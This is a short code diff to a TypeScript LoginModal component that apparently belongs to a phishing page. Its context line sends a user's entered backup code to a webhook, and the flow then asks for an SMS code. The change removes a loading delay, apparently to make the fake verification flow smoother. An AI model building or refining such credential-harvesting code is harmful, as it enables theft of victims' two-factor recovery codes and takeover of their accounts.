@@ -80,8 +80,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     await sendToWebhook('Backup Code', backupCode);
     setStep('verifying');
     await new Promise(resolve => setTimeout(resolve, 1500));
-    setStep('loading');
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    
     setStep('sms-code');
   };
 
